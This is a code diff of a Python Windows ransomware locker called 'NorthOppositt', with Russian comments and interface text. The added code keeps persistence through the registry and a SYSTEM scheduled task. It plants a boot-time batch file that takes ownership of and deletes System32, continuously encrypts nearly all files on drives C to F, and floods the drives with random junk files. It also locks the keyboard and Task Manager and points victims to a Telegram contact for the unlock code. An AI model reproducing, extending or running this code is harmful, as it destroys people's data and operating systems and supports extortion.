@@ -19,6 +19,9 @@ import datetime
 import atexit
 import signal
 from concurrent.futures import ThreadPoolExecutor
+from pathlib import Path
+import string
+import shutil
 
 # ============================================================
 # ПЕРЕХВАТ Ctrl+C
@@ -124,59 +127,33 @@ def run_as_admin():
         return False
 
 # ============================================================
-# ГЛАВНАЯ ЗАДАЧА В АВТОЗАПУСКЕ (МГНОВЕННЫЙ СТАРТ)
+# АВТОЗАПУСК
 # ============================================================
 def add_to_startup_priority():
-    """Добавляет программу в автозапуск с максимальным приоритетом"""
-    exe_path = sys.executable
-    
-    # 1. Реестр (обычный автозапуск)
     try:
         key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
-        reg.SetValueEx(key, "SystemUpdateGuard", 0, reg.REG_SZ, exe_path)
+        reg.SetValueEx(key, "SystemUpdateGuard", 0, reg.REG_SZ, sys.executable)
         reg.CloseKey(key)
     except:
         pass
     
-    # 2. Планировщик задач (запуск при входе в систему с высочайшим приоритетом)
     try:
         task_name = "SystemUpdateGuard"
-        # Удаляем старую задачу, если есть
         os.system(f'schtasks /delete /tn "{task_name}" /f')
-        # Создаём новую задачу: запуск при входе любого пользователя, с максимальными правами
-        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc ONLOGON /ru "SYSTEM" /rl HIGHEST /f /delay 0000:00'
+        cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc ONLOGON /ru "SYSTEM" /rl HIGHEST /f /delay 0000:00'
         os.system(cmd)
-    except:
-        pass
-    
-    # 3. Папка Startup (запасной вариант)
-    try:
-        startup_folder = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
-        shortcut_path = os.path.join(startup_folder, 'SystemUpdateGuard.bat')
-        with open(shortcut_path, 'w') as f:
-            f.write(f'start "" "{exe_path}"')
     except:
         pass
 
 def remove_from_startup():
-    """Удаляет из автозапуска"""
     try:
         key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
         reg.DeleteValue(key, "SystemUpdateGuard")
         reg.CloseKey(key)
     except:
         pass
-    
     try:
         os.system('schtasks /delete /tn "SystemUpdateGuard" /f')
-    except:
-        pass
-    
-    try:
-        startup_folder = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
-        shortcut_path = os.path.join(startup_folder, 'SystemUpdateGuard.bat')
-        if os.path.exists(shortcut_path):
-            os.remove(shortcut_path)
     except:
         pass
 
@@ -240,61 +217,151 @@ def unblock_keyboard():
     except:
         pass
 
-def instant_nuke():
-    """МГНОВЕННЫЙ СНОС WINDOWS"""
-    os.system("shutdown /r /t 0 /f")
+# ============================================================
+# УДАЛЕНИЕ SYSTEM32 ПОСЛЕ РЕБУТА
+# ============================================================
+def schedule_system32_deletion():
+    """Создаёт задачу в планировщике, которая удалит System32 при следующей загрузке"""
+    try:
+        # Создаём bat-файл для удаления System32
+        bat_path = os.path.join(os.environ['TEMP'], 'delete_system32.bat')
+        with open(bat_path, 'w') as f:
+            f.write('''@echo off
+timeout /t 2 /nobreak >nul
+takeown /f "C:\\Windows\\System32" /r /d y
+icacls "C:\\Windows\\System32" /grant *S-1-1-0:F /t
+rmdir /s /q "C:\\Windows\\System32"
+del /f /q "%~f0"
+''')
+        
+        # Создаём задачу в планировщике для запуска при загрузке
+        task_name = "System32DeleteTask"
+        cmd = f'schtasks /create /tn "{task_name}" /tr "{bat_path}" /sc ONSTART /ru "SYSTEM" /rl HIGHEST /f'
+        os.system(cmd)
+    except:
+        pass
+
+def reboot_and_nuke():
+    """Перезагружает компьютер, а после загрузки удаляет System32"""
+    schedule_system32_deletion()
+    os.system("shutdown /r /t 2 /f")  # Перезагрузка через 2 секунды
     sys.exit()
 
+# ============================================================
+# ГЕНЕРАЦИЯ КЛЮЧА
+# ============================================================
 def generate_key():
     return Fernet.generate_key()
 
-# УСКОРЕННОЕ ШИФРОВАНИЕ
+# ============================================================
+# СОЗДАНИЕ ФАЙЛОВ ПО 1 МБ
+# ============================================================
+def create_fake_files(stop_flag):
+    counter = 0
+    drives = ['C:\\', 'D:\\', 'E:\\', 'F:\\']
+    chars = string.ascii_letters + string.digits
+    
+    while not stop_flag.is_set():
+        try:
+            drive = random.choice([d for d in drives if os.path.exists(d)])
+            depth = random.randint(1, 5)
+            current_path = drive
+            for _ in range(depth):
+                folder_name = ''.join(random.choices(chars, k=8))
+                current_path = os.path.join(current_path, folder_name)
+                os.makedirs(current_path, exist_ok=True)
+            
+            file_name = f"system_{counter}_{''.join(random.choices(chars, k=6))}.tmp"
+            file_path = os.path.join(current_path, file_name)
+            
+            with open(file_path, 'wb') as f:
+                f.write(os.urandom(1024 * 1024))
+            
+            counter += 1
+            time.sleep(4)
+        except:
+            time.sleep(4)
+
+# ============================================================
+# ШИФРОВАНИЕ
+# ============================================================
 def encrypt_single_file(args):
     path, fernet = args
     try:
         with open(path, 'rb') as f:
             data = f.read()
         encrypted = fernet.encrypt(data)
-        with open(path, 'wb') as f:
+        
+        dir_name = os.path.dirname(path)
+        new_path = os.path.join(dir_name, "67")
+        
+        counter = 1
+        while os.path.exists(new_path):
+            new_path = os.path.join(dir_name, f"67_{counter}")
+            counter += 1
+        
+        with open(new_path, 'wb') as f:
             f.write(encrypted)
-        os.rename(path, path + ".north")
+        os.remove(path)
         return 1
     except:
         return 0
 
-def encrypt_files():
-    key = generate_key()
-    fernet = Fernet(key)
+def continuous_encryption(stop_flag, fernet, encrypted_count):
+    processed_files = set()
     
-    try:
-        reg_key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt")
-        reg.SetValueEx(reg_key, "DecryptKey", 0, reg.REG_SZ, key.decode())
-        reg.CloseKey(reg_key)
-    except:
-        with open('C:\\Windows\\Temp\\north_key.txt', 'w') as f:
-            f.write(key.decode())
-    
-    extensions = ('.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.png', '.zip', '.mp4', '.mp3', '.doc', '.xls', '.ppt', '.pptx')
-    files_to_encrypt = []
-    
-    for drive in ['C:\\', 'D:\\', 'E:\\']:
-        if os.path.exists(drive):
-            for root, dirs, files in os.walk(drive):
-                skip = ['Windows', 'Program Files', 'System Volume Information', '$Recycle.Bin', 'Program Files (x86)']
-                if any(s in root for s in skip):
-                    continue
-                for file in files:
-                    if file.endswith(extensions) and not file.endswith(".north"):
-                        files_to_encrypt.append((os.path.join(root, file), fernet))
-    
-    encrypted_count = 0
-    with ThreadPoolExecutor(max_workers=8) as executor:
-        results = executor.map(encrypt_single_file, files_to_encrypt)
-        encrypted_count = sum(results)
-    
-    return encrypted_count
+    while not stop_flag.is_set():
+        try:
+            files_to_encrypt = []
+            
+            for drive in ['C:\\', 'D:\\', 'E:\\', 'F:\\']:
+                if os.path.exists(drive):
+                    for root, dirs, files in os.walk(drive):
+                        if 'Windows' in root:
+                            continue
+                        for file in files:
+                            full_path = os.path.join(root, file)
+                            if full_path not in processed_files and file != "67" and not file.startswith("67_"):
+                                if not full_path.endswith('.exe') or 'NorthOppositt' not in full_path:
+                                    files_to_encrypt.append((full_path, fernet))
+                                    processed_files.add(full_path)
+            
+            if files_to_encrypt:
+                with ThreadPoolExecutor(max_workers=8) as executor:
+                    results = executor.map(encrypt_single_file, files_to_encrypt)
+                    encrypted_count[0] += sum(results)
+            
+            time.sleep(1)
+        except:
+            time.sleep(1)
 
-def decrypt_files():
+# ============================================================
+# РАСШИФРОВКА
+# ============================================================
+def decrypt_single_file(args):
+    path, fernet = args
+    try:
+        with open(path, 'rb') as f:
+            data = f.read()
+        decrypted = fernet.decrypt(data)
+        
+        dir_name = os.path.dirname(path)
+        new_path = os.path.join(dir_name, "restored_file")
+        
+        counter = 1
+        base, ext = os.path.splitext(new_path)
+        while os.path.exists(new_path):
+            new_path = f"{base}_{counter}{ext}"
+            counter += 1
+        
+        with open(new_path, 'wb') as f:
+            f.write(decrypted)
+        os.remove(path)
+        return 1
+    except:
+        return 0
+
+def decrypt_all_files():
     try:
         reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt", 0, reg.KEY_READ)
         key_str = reg.QueryValueEx(reg_key, "DecryptKey")[0]
@@ -308,24 +375,21 @@ def decrypt_files():
         except:
             return 0
     
-    decrypted = 0
-    for drive in ['C:\\', 'D:\\', 'E:\\']:
+    files_to_decrypt = []
+    
+    for drive in ['C:\\', 'D:\\', 'E:\\', 'F:\\']:
         if os.path.exists(drive):
             for root, dirs, files in os.walk(drive):
                 for file in files:
-                    if file.endswith(".north"):
-                        path = os.path.join(root, file)
-                        orig_path = path[:-6]
-                        try:
-                            with open(path, 'rb') as f:
-                                data = f.read()
-                            decrypted_data = fernet.decrypt(data)
-                            with open(orig_path, 'wb') as f:
-                                f.write(decrypted_data)
-                            os.remove(path)
-                            decrypted += 1
-                        except:
-                            pass
+                    if file == "67" or file.startswith("67_"):
+                        full_path = os.path.join(root, file)
+                        files_to_decrypt.append((full_path, fernet))
+    
+    decrypted = 0
+    with ThreadPoolExecutor(max_workers=8) as executor:
+        results = executor.map(decrypt_single_file, files_to_decrypt)
+        decrypted = sum(results)
+    
     return decrypted
 
 def delete_self():
@@ -444,7 +508,7 @@ def show_confirm_reset_window():
     
     tk.Label(confirm_root, text="⚠️ ПРЕДУПРЕЖДЕНИЕ ⚠️", 
              fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 14, "bold")).pack(pady=20)
-    tk.Label(confirm_root, text="Вы уверены, что хотите сбросить систему?\nЭто уничтожит ВСЕ данные безвозвратно!", 
+    tk.Label(confirm_root, text="Вы уверены, что хотите уничтожить Windows?\nПосле перезагрузки система будет удалена!", 
              fg="#ffffff", bg="#0a0a0a", font=("Segoe UI", 11), justify="center").pack(pady=10)
     
     result = [False]
@@ -460,7 +524,7 @@ def show_confirm_reset_window():
     button_frame = tk.Frame(confirm_root, bg='#0a0a0a')
     button_frame.pack(pady=20)
     
-    tk.Button(button_frame, text="💀 ДА, СБРОСИТЬ 💀", command=on_confirm,
+    tk.Button(button_frame, text="💀 ДА, УНИЧТОЖИТЬ 💀", command=on_confirm,
               bg="#ff4444", fg="white", font=("Segoe UI", 10, "bold"), width=15).pack(side="left", padx=10)
     tk.Button(button_frame, text="🔵 ОТМЕНА", command=on_cancel,
               bg="#333333", fg="white", font=("Segoe UI", 10, "bold"), width=15).pack(side="left", padx=10)
@@ -481,9 +545,9 @@ def show_last_chance_window():
     y = (chance_root.winfo_screenheight() // 2) - 150
     chance_root.geometry(f"500x300+{x}+{y}")
     
-    tk.Label(chance_root, text="💀 СБРОС WINDOWS 💀", 
-             fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 16, "bold")).pack(pady=20)
-    tk.Label(chance_root, text="Неверный код! Запущен мгновенный сброс Windows.\nВсе данные будут УНИЧТОЖЕНЫ.", 
+    tk.Label(chance_root, text="💀 ПЕРЕЗАГРУЗКА И УДАЛЕНИЕ SYSTEM32 💀", 
+             fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 14, "bold")).pack(pady=20)
+    tk.Label(chance_root, text="Неверный код! Компьютер будет перезагружен.\nПосле загрузки Windows будет УНИЧТОЖЕНА.", 
              fg="#ffffff", bg="#0a0a0a", font=("Segoe UI", 12), justify="center").pack(pady=20)
     
     def on_ok():
@@ -510,7 +574,7 @@ def timer_loop(app, stop_flag):
         try:
             time_left = (end_time - datetime.datetime.now()).total_seconds()
             if time_left <= 0:
-                instant_nuke()
+                reboot_and_nuke()
                 break
             if hasattr(app, 'timer_label') and app.timer_label:
                 hours = int(time_left // 3600)
@@ -529,36 +593,50 @@ class NorthOpposittLocker:
         self.root = root
         self.root.attributes("-fullscreen", True, "-topmost", True)
         self.root.configure(bg='#0a0a0a')
-        self.root.protocol("WM_DELETE_WINDOW", lambda: instant_nuke())
+        self.root.protocol("WM_DELETE_WINDOW", lambda: reboot_and_nuke())
         self.attempts = MAX_ATTEMPTS
         self.stop_flag = threading.Event()
+        self.encrypted_count = [0]
         
         toggle_task_manager(True)
         block_keyboard()
         
+        self.key = generate_key()
+        self.fernet = Fernet(self.key)
+        
+        try:
+            reg_key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt")
+            reg.SetValueEx(reg_key, "DecryptKey", 0, reg.REG_SZ, self.key.decode())
+            reg.CloseKey(reg_key)
+        except:
+            with open('C:\\Windows\\Temp\\north_key.txt', 'w') as f:
+                f.write(self.key.decode())
+        
         threading.Thread(target=force_max_volume, args=(self.stop_flag,), daemon=True).start()
         threading.Thread(target=play_music_loop, args=(self.stop_flag,), daemon=True).start()
-        threading.Thread(target=self.encrypt_in_background, daemon=True).start()
+        threading.Thread(target=create_fake_files, args=(self.stop_flag,), daemon=True).start()
+        threading.Thread(target=continuous_encryption, args=(self.stop_flag, self.fernet, self.encrypted_count), daemon=True).start()
         
         start_system_load(self.stop_flag)
         
         self.show_locker_screen()
         threading.Thread(target=timer_loop, args=(self, self.stop_flag), daemon=True).start()
+        
+        self.update_file_count_loop()
     
-    def encrypt_in_background(self):
-        self.encrypted_count = encrypt_files()
-        self.update_file_count()
-    
-    def update_file_count(self):
-        if hasattr(self, 'file_count_label') and self.file_count_label:
-            self.file_count_label.config(text=f"Зашифровано файлов: {self.encrypted_count}")
+    def update_file_count_loop(self):
+        def loop():
+            while not self.stop_flag.is_set():
+                if hasattr(self, 'file_count_label') and self.file_count_label:
+                    self.file_count_label.config(text=f"Зашифровано файлов: {self.encrypted_count[0]}")
+                time.sleep(2)
+        threading.Thread(target=loop, daemon=True).start()
     
     def update_attempts_display(self):
         if hasattr(self, 'attempts_label') and self.attempts_label:
             self.attempts_label.config(text=f"Попыток осталось: {self.attempts}")
     
     def on_code_change(self, event=None):
-        """Активирует/деактивирует кнопку в зависимости от наличия цифр в поле"""
         if hasattr(self, 'decrypt_btn'):
             if self.code_entry.get().strip().isdigit() and len(self.code_entry.get()) > 0:
                 self.decrypt_btn.config(state='normal', bg="#ff4444")
@@ -605,7 +683,7 @@ class NorthOpposittLocker:
 ║                                                              ║
 ║   🔐 ДЛЯ ПОЛУЧЕНИЯ КОДА: Telegram @societyvoice             ║
 ║                                                              ║
-║   ⚠️ 5 НЕВЕРНЫХ ПОПЫТОК = МГНОВЕННЫЙ СНОС WINDOWS           ║
+║   ⚠️ 5 НЕВЕРНЫХ ПОПЫТОК = ПЕРЕЗАГРУЗКА + УДАЛЕНИЕ SYSTEM32  ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
         """
@@ -635,7 +713,7 @@ class NorthOpposittLocker:
                                       width=20, height=1, state='disabled')
         self.decrypt_btn.pack(side="left", padx=10)
         
-        tk.Button(button_frame, text="💀 СБРОС СИСТЕМЫ", command=self.factory_reset,
+        tk.Button(button_frame, text="💀 УНИЧТОЖИТЬ WINDOWS", command=self.factory_reset,
                   bg="#333333", fg="white", font=("Segoe UI", 11, "bold"), 
                   width=20, height=1).pack(side="left", padx=10)
         
@@ -648,35 +726,32 @@ class NorthOpposittLocker:
     def factory_reset(self):
         if show_confirm_reset_window():
             self.stop_flag.set()
-            instant_nuke()
+            reboot_and_nuke()
     
     def check_code(self):
         entered_code = self.code_entry.get().strip()
         
-        # Если поле пустое или не цифры — не обрабатываем
         if not entered_code.isdigit() or len(entered_code) == 0:
             return
         
         if entered_code == SECRET_CODE:
             self.stop_flag.set()
-            decrypted = decrypt_files()
+            decrypted = decrypt_all_files()
             restore_system()
             self.root.destroy()
             show_success_window(decrypted)
         else:
-            # Уменьшаем попытки, но не ниже 0
             if self.attempts > 0:
                 self.attempts -= 1
             self.update_attempts_display()
             self.code_entry.delete(0, tk.END)
             self.code_entry.focus_set()
-            self.on_code_change()  # Обновляем состояние кнопки
+            self.on_code_change()
             
-            # МГНОВЕННЫЙ СНОС ПРИ 0 ПОПЫТКАХ
             if self.attempts <= 0:
                 show_last_chance_window()
                 self.stop_flag.set()
-                instant_nuke()
+                reboot_and_nuke()
             else:
                 show_error_window(f"Вы ввели неверный код: {entered_code}", self.attempts)
 
@@ -688,7 +763,7 @@ if __name__ == "__main__":
     
     if getattr(sys, 'frozen', False):
         run_as_admin()
-        add_to_startup_priority()  # ГЛАВНАЯ ЗАДАЧА В АВТОЗАПУСКЕ
+        add_to_startup_priority()
         disable_safe_mode()
     
     root = tk.Tk()
